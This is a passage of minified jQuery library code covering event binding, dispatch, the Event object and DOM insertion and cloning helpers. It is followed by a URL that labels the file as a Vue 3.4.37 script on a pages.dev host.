                a,
                s,
                u,
                l,
                c,
                f,
                p,
                d,
                h,
                g,
                v = Y.get(e);
            if (V(e))
                for (
                    n.handler && ((n = (o = n).handler), (i = o.selector)),
                        i && b.find.matchesSelector(er, i),
                        n.guid || (n.guid = b.guid++),
                        (u = v.events) || (u = v.events = Object.create(null)),
                        (a = v.handle) ||
                            (a = v.handle = function (t) {
                                return void 0 !== b && b.event.triggered !== t.type ? b.event.dispatch.apply(e, arguments) : void 0;
                            }),
                        l = (t = (t || "").match(H) || [""]).length;
                    l--;

                )
                    (d = g = (s = eb.exec(t[l]) || [])[1]),
                        (h = (s[2] || "").split(".").sort()),
                        d &&
                            ((f = b.event.special[d] || {}),
                            (d = (i ? f.delegateType : f.bindType) || d),
                            (f = b.event.special[d] || {}),
                            (c = b.extend({ type: d, origType: g, data: r, handler: n, guid: n.guid, selector: i, needsContext: i && b.expr.match.needsContext.test(i), namespace: h.join(".") }, o)),
                            (p = u[d]) || (((p = u[d] = []).delegateCount = 0), (f.setup && !1 !== f.setup.call(e, r, h, a)) || (e.addEventListener && e.addEventListener(d, a))),
                            f.add && (f.add.call(e, c), c.handler.guid || (c.handler.guid = n.guid)),
                            i ? p.splice(p.delegateCount++, 0, c) : p.push(c),
                            (b.event.global[d] = !0));
        },
        remove: function (e, t, n, r, i) {
            var o,
                a,
                s,
                u,
                l,
                c,
                f,
                p,
                d,
                h,
                g,
                v = Y.hasData(e) && Y.get(e);
            if (v && (u = v.events)) {
                for (l = (t = (t || "").match(H) || [""]).length; l--; )
                    if (((d = g = (s = eb.exec(t[l]) || [])[1]), (h = (s[2] || "").split(".").sort()), d)) {
                        for (f = b.event.special[d] || {}, p = u[(d = (r ? f.delegateType : f.bindType) || d)] || [], s = s[2] && RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), a = o = p.length; o--; )
                            (c = p[o]),
                                (!i && g !== c.origType) ||
                                    (n && n.guid !== c.guid) ||
                                    (s && !s.test(c.namespace)) ||
                                    (r && r !== c.selector && ("**" !== r || !c.selector)) ||
                                    (p.splice(o, 1), c.selector && p.delegateCount--, f.remove && f.remove.call(e, c));
                        a && !p.length && ((f.teardown && !1 !== f.teardown.call(e, h, v.handle)) || b.removeEvent(e, d, v.handle), delete u[d]);
                    } else for (d in u) b.event.remove(e, d + t[l], n, r, !0);
                b.isEmptyObject(u) && Y.remove(e, "handle events");
            }
        },
        dispatch: function (e) {
            var t,
                n,
                r,
                i,
                o,
                a,
                s = Array(arguments.length),
                u = b.event.fix(e),
                l = (Y.get(this, "events") || Object.create(null))[u.type] || [],
                c = b.event.special[u.type] || {};
            for (s[0] = u, t = 1; t < arguments.length; t++) s[t] = arguments[t];
            if (((u.delegateTarget = this), !c.preDispatch || !1 !== c.preDispatch.call(this, u))) {
                for (a = b.event.handlers.call(this, u, l), t = 0; (i = a[t++]) && !u.isPropagationStopped(); )
                    for (u.currentTarget = i.elem, n = 0; (o = i.handlers[n++]) && !u.isImmediatePropagationStopped(); )
                        (u.rnamespace && !1 !== o.namespace && !u.rnamespace.test(o.namespace)) ||
                            ((u.handleObj = o), (u.data = o.data), void 0 !== (r = ((b.event.special[o.origType] || {}).handle || o.handler).apply(i.elem, s)) && !1 === (u.result = r) && (u.preventDefault(), u.stopPropagation()));
                return c.postDispatch && c.postDispatch.call(this, u), u.result;
            }
        },
        handlers: function (e, t) {
            var n,
                r,
                i,
                o,
                a,
                s = [],
                u = t.delegateCount,
                l = e.target;
            if (u && l.nodeType && !("click" === e.type && e.button >= 1)) {
                for (; l !== this; l = l.parentNode || this)
                    if (1 === l.nodeType && ("click" !== e.type || !0 !== l.disabled)) {
                        for (o = [], a = {}, n = 0; n < u; n++) void 0 === a[(i = (r = t[n]).selector + " ")] && (a[i] = r.needsContext ? b(i, this).index(l) > -1 : b.find(i, this, null, [l]).length), a[i] && o.push(r);
                        o.length && s.push({ elem: l, handlers: o });
                    }
            }
            return (l = this), u < t.length && s.push({ elem: l, handlers: t.slice(u) }), s;
        },
        addProp: function (e, t) {
            Object.defineProperty(b.Event.prototype, e, {
                enumerable: !0,
                configurable: !0,
                get: h(t)
                    ? function () {
                          if (this.originalEvent) return t(this.originalEvent);
                      }
                    : function () {
                          if (this.originalEvent) return this.originalEvent[e];
                      },
                set: function (t) {
                    Object.defineProperty(this, e, { enumerable: !0, configurable: !0, writable: !0, value: t });
                },
            });
        },
        fix: function (e) {
            return e[b.expando] ? e : new b.Event(e);
        },
        special: {
            load: { noBubble: !0 },
            click: {
                setup: function (e) {
                    var t = this || e;
                    return ed.test(t.type) && t.click && S(t, "input") && ek(t, "click", e_), !1;
                },
                trigger: function (e) {
                    var t = this || e;
                    return ed.test(t.type) && t.click && S(t, "input") && ek(t, "click"), !0;
                },
                _default: function (e) {
                    var t = e.target;
                    return (ed.test(t.type) && t.click && S(t, "input") && Y.get(t, "click")) || S(t, "a");
                },
            },
            beforeunload: {
                postDispatch: function (e) {
                    void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result);
                },
            },
        },
    }),
        (b.removeEvent = function (e, t, n) {
            e.removeEventListener && e.removeEventListener(t, n);
        }),
        (b.Event = function (e, t) {
            if (!(this instanceof b.Event)) return new b.Event(e, t);
            e && e.type
                ? ((this.originalEvent = e),
                  (this.type = e.type),
                  (this.isDefaultPrevented = e.defaultPrevented || (void 0 === e.defaultPrevented && !1 === e.returnValue) ? e_ : eT),
                  (this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target),
                  (this.currentTarget = e.currentTarget),
                  (this.relatedTarget = e.relatedTarget))
                : (this.type = e),
                t && b.extend(this, t),
                (this.timeStamp = (e && e.timeStamp) || Date.now()),
                (this[b.expando] = !0);
        }),
        (b.Event.prototype = {
            constructor: b.Event,
            isDefaultPrevented: eT,
            isPropagationStopped: eT,
            isImmediatePropagationStopped: eT,
            isSimulated: !1,
            preventDefault: function () {
                var e = this.originalEvent;
                (this.isDefaultPrevented = e_), e && !this.isSimulated && e.preventDefault();
            },
            stopPropagation: function () {
                var e = this.originalEvent;
                (this.isPropagationStopped = e_), e && !this.isSimulated && e.stopPropagation();
            },
            stopImmediatePropagation: function () {
                var e = this.originalEvent;
                (this.isImmediatePropagationStopped = e_), e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation();
            },
        }),
        b.each(
            {
                altKey: !0,
                bubbles: !0,
                cancelable: !0,
                changedTouches: !0,
                ctrlKey: !0,
                detail: !0,
                eventPhase: !0,
                metaKey: !0,
                pageX: !0,
                pageY: !0,
                shiftKey: !0,
                view: !0,
                char: !0,
                code: !0,
                charCode: !0,
                key: !0,
                keyCode: !0,
                button: !0,
                buttons: !0,
                clientX: !0,
                clientY: !0,
                offsetX: !0,
                offsetY: !0,
                pointerId: !0,
                pointerType: !0,
                screenX: !0,
                screenY: !0,
                targetTouches: !0,
                toElement: !0,
                touches: !0,
                which: !0,
            },
            b.event.addProp
        ),
        b.each({ focus: "focusin", blur: "focusout" }, function (e, t) {
            b.event.special[e] = {
                setup: function () {
                    return ek(this, e, ew), !1;
                },
                trigger: function () {
                    return ek(this, e), !0;
                },
                _default: function () {
                    return !0;
                },
                delegateType: t,
            };
        }),
        b.each({ mouseenter: "mouseover", mouseleave: "mouseout", pointerenter: "pointerover", pointerleave: "pointerout" }, function (e, t) {
            b.event.special[e] = {
                delegateType: t,
                bindType: t,
                handle: function (e) {
                    var n,
                        r = e.relatedTarget,
                        i = e.handleObj;
                    return (r && (r === this || b.contains(this, r))) || ((e.type = i.origType), (n = i.handler.apply(this, arguments)), (e.type = t)), n;
                },
            };
        }),
        b.fn.extend({
            on: function (e, t, n, r) {
                return eC(this, e, t, n, r);
            },
            one: function (e, t, n, r) {
                return eC(this, e, t, n, r, 1);
            },
            off: function (e, t, n) {
                var r, i;
                if (e && e.preventDefault && e.handleObj) return (r = e.handleObj), b(e.delegateTarget).off(r.namespace ? r.origType + "." + r.namespace : r.origType, r.selector, r.handler), this;
                if ("object" == typeof e) {
                    for (i in e) this.off(i, t, e[i]);
                    return this;
                }
                return (
                    (!1 !== t && "function" != typeof t) || ((n = t), (t = void 0)),
                    !1 === n && (n = eT),
                    this.each(function () {
                        b.event.remove(this, e, n, t);
                    })
                );
            },
        });
    var eS = /<script|<style|<link/i,
        eE = /checked\s*(?:[^=]|=\s*.checked.)/i,
        eN = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;
    function eA(e, t) {
        return (S(e, "table") && S(11 !== t.nodeType ? t : t.firstChild, "tr") && b(e).children("tbody")[0]) || e;
    }
    function eD(e) {
        return (e.type = (null !== e.getAttribute("type")) + "/" + e.type), e;
    }
    function ej(e) {
        return "true/" === (e.type || "").slice(0, 5) ? (e.type = e.type.slice(5)) : e.removeAttribute("type"), e;
    }
    function eq(e, t) {
        var n, r, i, o, a, s;
        if (1 === t.nodeType) {
            if (Y.hasData(e) && (s = Y.get(e).events)) for (i in (Y.remove(t, "handle events"), s)) for (n = 0, r = s[i].length; n < r; n++) b.event.add(t, i, s[i][n]);
            Q.hasData(e) && ((o = Q.access(e)), (a = b.extend({}, o)), Q.set(t, a));
        }
    }
    function eL(e, t, n, r) {
        t = o(t);
        var i,
            a,
            s,
            u,
            l,
            c,
            f = 0,
            p = e.length,
            g = p - 1,
            v = t[0],
            m = h(v);
        if (m || (p > 1 && "string" == typeof v && !d.checkClone && eE.test(v)))
            return e.each(function (i) {
                var o = e.eq(i);
                m && (t[0] = v.call(this, i, o.html())), eL(o, t, n, r);
            });
        if (p && ((a = (i = ex(t, e[0].ownerDocument, !1, e, r)).firstChild), 1 === i.childNodes.length && (i = a), a || r)) {
            for (u = (s = b.map(em(i, "script"), eD)).length; f < p; f++) (l = i), f !== g && ((l = b.clone(l, !0, !0)), u && b.merge(s, em(l, "script"))), n.call(e[f], l, f);
            if (u)
                for (c = s[s.length - 1].ownerDocument, b.map(s, ej), f = 0; f < u; f++)
                    (l = s[f]),
                        eg.test(l.type || "") &&
                            !Y.access(l, "globalEval") &&
                            b.contains(c, l) &&
                            (l.src && "module" !== (l.type || "").toLowerCase() ? b._evalUrl && !l.noModule && b._evalUrl(l.src, { nonce: l.nonce || l.getAttribute("nonce") }, c) : y(l.textContent.replace(eN, ""), l, c));
        }
        return e;
    }
    function eH(e, t, n) {
        for (var r, i = t ? b.filter(t, e) : e, o = 0; null != (r = i[o]); o++) n || 1 !== r.nodeType || b.cleanData(em(r)), r.parentNode && (n && ei(r) && ey(em(r, "script")), r.parentNode.removeChild(r));
        return e;
    }
    b.extend({
        htmlPrefilter: function (e) {
            return e;
        },
        clone: function (e, t, n) {
            var r,
                i,
                o,
                a,
                s,
                u,
                l,
                c = e.cloneNode(!0),
                f = ei(e);
            if (!(d.noCloneChecked || (1 !== e.nodeType && 11 !== e.nodeType) || b.isXMLDoc(e)))
                for (a = em(c), r = 0, i = (o = em(e)).length; r < i; r++)
                    (s = o[r]), …"
 https://vue-iwj.pages.dev/vue-3.4.37.js#:~:text=!(function%20(e%2C%20t,e.%24%20%3D%20b)%2C%0A%20%20%20%20%20%20%20%20b%0A%20%20%20%20)%3B%0A%7D)%3B